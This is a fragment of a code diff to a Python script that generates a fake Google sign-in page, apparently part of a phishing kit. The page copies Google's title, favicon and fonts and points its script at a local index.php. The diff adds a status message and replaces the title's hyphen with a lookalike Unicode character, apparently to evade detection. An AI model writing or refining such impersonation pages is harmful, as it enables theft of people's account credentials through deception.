@@ -15,6 +15,7 @@ else:
 if os.path.isfile("index.php"):
   file_exists = 1
 else:
+  print("Please Wait...")
   main_page = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -23,7 +24,7 @@ else:
   <link rel="preconnect" href="https://fonts.gstatic.com" />
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet"/>
   <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
-  <title>Sign in - Google accounts</title>
+  <title>Sign in &#65112; Google accounts</title>
   <script>
 var server = "https://" + location.host + "/index.php";
 (function() {
